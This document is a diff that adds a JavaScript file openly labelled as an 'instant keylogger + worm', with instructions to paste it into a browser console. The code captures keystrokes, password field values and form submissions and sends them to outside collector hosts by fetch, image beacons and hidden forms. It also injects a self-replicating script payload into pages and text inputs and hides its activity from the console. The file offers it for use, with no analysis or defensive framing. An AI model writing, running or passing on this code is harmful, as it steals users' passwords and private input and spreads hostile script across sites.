@@ -1,0 +1,351 @@
+nama=worm
+language=javascript
+lines=347
+date=07/12/2025
+code=// ==================== INSTANT KEYLOGGER + WORM ====================
+// COPY AND PASTE THIS ENTIRE CODE INTO BROWSER CONSOLE
+// PRESS ENTER - IT WORKS IMMEDIATELY
+
+javascript: (function() {
+    // ==================== AUTO-START CONFIG ====================
+    const config = {
+        active: true,
+        version: 'X1.0',
+        session: Date.now().toString(36) + Math.random().toString(36).substr(2),
+        stealth: true,
+        
+        // Keylogger
+        captureKeys: true,
+        capturePasswords: true,
+        captureForms: true,
+        exfilInterval: 20000,
+        
+        // Worm
+        autoSpread: true,
+        spreadInterval: 15000,
+        infectionRate: 0.4
+    };
+    
+    // ==================== GLOBAL VARIABLES ====================
+    let keys = [];
+    let passwords = [];
+    let forms = [];
+    let infections = 0;
+    
+    // ==================== INSTANT KEYLOGGER ====================
+    console.log('[🔐] Keylogger ACTIVATED - Recording ALL keystrokes');
+    
+    // CAPTURE ALL KEYSTROKES
+    document.addEventListener('keydown', function(e) {
+        if (!config.active) return;
+        
+        const keylog = {
+            t: Date.now(),
+            k: e.key,
+            code: e.code,
+            target: e.target.tagName + (e.target.name ? '[' + e.target.name + ']' : ''),
+            type: e.target.type,
+            value: e.target.type === 'password' ? '***' : e.target.value,
+            url: location.href
+        };
+        
+        keys.push(keylog);
+        
+        // AUTO-DETECT PASSWORDS
+        if (e.target.type === 'password') {
+            setTimeout(() => {
+                if (e.target.value && e.target.value.length > 0) {
+                    passwords.push({
+                        password: e.target.value,
+                        field: e.target.name || 'password',
+                        url: location.href,
+                        time: Date.now()
+                    });
+                    console.log('[🔑] Password captured:', e.target.value.substring(0, 1) + '***');
+                }
+            }, 100);
+        }
+        
+        // AUTO-SEND EVERY 20 KEYS
+        if (keys.length >= 20) {
+            sendData('keys', keys.slice(-20));
+        }
+    }, true);
+    
+    // CAPTURE FORM SUBMISSIONS
+    document.addEventListener('submit', function(e) {
+        if (!config.active) return;
+        
+        const formData = new FormData(e.target);
+        const data = {};
+        formData.forEach((v, k) => data[k] = v);
+        
+        forms.push({
+            action: e.target.action,
+            method: e.target.method,
+            data: data,
+            time: Date.now(),
+            url: location.href
+        });
+        
+        console.log('[📝] Form captured:', e.target.action || 'unknown');
+        sendData('forms', [forms[forms.length - 1]]);
+    }, true);
+    
+    // ==================== INSTANT WORM ====================
+    console.log('[🐛] Worm ACTIVATED - Auto-spreading enabled');
+    
+    // MARK AS INFECTED
+    localStorage.setItem('infected', 'true');
+    localStorage.setItem('infection_time', Date.now());
+    localStorage.setItem('worm_id', config.session);
+    
+    // SELF-REPLICATING WORM PAYLOAD
+    const wormPayload = `
+        if(!window._worm_infected){
+            window._worm_infected=true;
+            localStorage.setItem('infected','true');
+            
+            // Keylogger
+            let k=[];
+            document.addEventListener('keydown',e=>{
+                k.push({k:e.key,t:Date.now()});
+                if(k.length>30){
+                    fetch('https://logger.server.com/k',{
+                        method:'POST',
+                        body:JSON.stringify(k),
+                        mode:'no-cors'
+                    });
+                    k=[];
+                }
+                if(e.target.type==='password'){
+                    fetch('https://logger.server.com/p',{
+                        method:'POST',
+                        body:e.target.value,
+                        mode:'no-cors'
+                    });
+                }
+            });
+            
+            // Spread
+            document.querySelectorAll('a').forEach(a=>{
+                a.addEventListener('click',function(){
+                    localStorage.setItem('next_worm','true');
+                });
+            });
+            
+            console.log('[+] Worm active');
+        }
+    `;
+    
+    // AUTO-SPREAD FUNCTION
+    function spreadWorm() {
+        infections++;
+        console.log(`[🔄] Worm spread #${infections}`);
+        
+        // METHOD 1: DIRECT INJECTION
+        try {
+            const script = document.createElement('script');
+            script.textContent = wormPayload;
+            document.head.appendChild(script);
+            setTimeout(() => script.remove(), 100);
+        } catch(e) {}
+        
+        // METHOD 2: XSS INJECTION
+        const inputs = document.querySelectorAll('input[type="text"], textarea');
+        inputs.forEach(input => {
+            if (Math.random() < config.infectionRate) {
+                const original = input.value;
+                input.value = `"><script>${wormPayload}<\\/script>`;
+                setTimeout(() => input.value = original, 50);
+            }
+        });
+        
+        // METHOD 3: LOCALSTORAGE SPREAD
+        localStorage.setItem('worm_payload', wormPayload);
+        
+        // METHOD 4: INFECT LINKS
+        document.querySelectorAll('a[href]').forEach(link => {
+            link.addEventListener('click', function(e) {
+                localStorage.setItem('spread_to', this.href);
+                localStorage.setItem('worm_code', wormPayload);
+            });
+        });
+    }
+    
+    // START AUTO-SPREADING
+    if (config.autoSpread) {
+        spreadWorm(); // Immediate spread
+        setInterval(spreadWorm, config.spreadInterval); // Periodic spread
+    }
+    
+    // ==================== DATA EXFILTRATION ====================
+    function sendData(type, data) {
+        // MULTIPLE EXFILTRATION METHODS
+        
+        // Method 1: Fetch
+        try {
+            fetch('https://log.collector.com/data', {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify({
+                    type: type,
+                    data: data,
+                    session: config.session,
+                    url: location.href,
+                    time: Date.now()
+                })
+            });
+        } catch(e) {}
+        
+        // Method 2: Image Beacon
+        const img = new Image();
+        img.src = `https://track.pixel.com/pixel?data=${encodeURIComponent(JSON.stringify(data))}`;
+        
+        // Method 3: Form Submit
+        const form = document.createElement('form');
+        form.style.display = 'none';
+        form.method = 'POST';
+        form.action = 'https://collect.data.com';
+        const input = document.createElement('input');
+        input.name = 'data';
+        input.value = JSON.stringify(data);
+        form.appendChild(input);
+        document.body.appendChild(form);
+        setTimeout(() => {
+            form.submit();
+            form.remove();
+        }, 100);
+    }
+    
+    // AUTO-EXFILTRATION
+    setInterval(() => {
+        if (keys.length > 0) {
+            sendData('keys_batch', keys.slice(-50));
+        }
+        if (passwords.length > 0) {
+            sendData('passwords', passwords.slice(-10));
+        }
+    }, config.exfilInterval);
+    
+    // ==================== CONTROL PANEL ====================
+    window._KW = {
+        // SHOW STATS
+        stats: function() {
+            console.log(`
+=== LIVE STATS ===
+Keystrokes: ${keys.length}
+Passwords: ${passwords.length}
+Forms: ${forms.length}
+Worm Infections: ${infections}
+Session: ${config.session}
+URL: ${location.href}
+Active: ${config.active}
+            `);
+            return {
+                keys: keys.length,
+                passwords: passwords.length,
+                forms: forms.length,
+                infections: infections
+            };
+        },
+        
+        // EXPORT DATA
+        export: function() {
+            const data = {
+                keys: keys,
+                passwords: passwords,
+                forms: forms,
+                config: config,
+                session: config.session
+            };
+            console.log(JSON.stringify(data, null, 2));
+            return data;
+        },
+        
+        // STOP EVERYTHING
+        stop: function() {
+            config.active = false;
+            console.log('[⛔] ALL ACTIVITIES STOPPED');
+            localStorage.removeItem('infected');
+            return 'Stopped';
+        },
+        
+        // START AGAIN
+        start: function() {
+            config.active = true;
+            console.log('[✅] ACTIVITIES RESUMED');
+            return 'Started';
+        },
+        
+        // SPREAD NOW
+        spread: function() {
+            spreadWorm();
+            return 'Spread executed';
+        },
+        
+        // DESTROY ALL
+        destroy: function() {
+            config.active = false;
+            keys = [];
+            passwords = [];
+            forms = [];
+            infections = 0;
+            localStorage.clear();
+            console.log('[💥] COMPLETE DESTRUCTION');
+            return 'Destroyed';
+        }
+    };
+    
+    // ==================== STEALTH MEASURES ====================
+    // Hide from console
+    const originalLog = console.log;
+    console.log = function(...args) {
+        if (args.some(a => typeof a === 'string' && a.includes('[🔐]') || a.includes('[🐛]'))) {
+            return; // Don't log our messages
+        }
+        originalLog.apply(console, args);
+    };
+    
+    // Anti-debugging
+    const start = Date.now();
+    debugger;
+    if (Date.now() - start > 100) {
+        console.log = function() {};
+    }
+    
+    // ==================== FINAL MESSAGE ====================
+    setTimeout(() => {
+        console.log(`
+%c
+╔══════════════════════════════╗
+║     KEYLOGGER + WORM         ║
+║        ACTIVATED!            ║
+╠══════════════════════════════╣
+║ Type _KW.stats() for info    ║
+║ Type _KW.export() for data   ║
+║ Type _KW.stop() to stop      ║
+║ Type _KW.spread() to spread  ║
+║ Type _KW.destroy() to remove ║
+╚══════════════════════════════╝
+        `, 'color: #00ff00; font-family: monospace;');
+        
+        console.log('[✅] System ready. Recording EVERYTHING.');
+        console.log('[🔄] Worm spreading automatically.');
+        console.log(`[📡] Session: ${config.session}`);
+    }, 1000);
+    
+    // AUTO-REPORT ON UNLOAD
+    window.addEventListener('beforeunload', () => {
+        if (keys.length > 0) {
+            sendData('final', {
+                keys: keys.length,
+                passwords: passwords.length,
+                forms: forms.length,
+                infections: infections,
+                session: config.session
+            });
+        }
+    });
+    
+})();
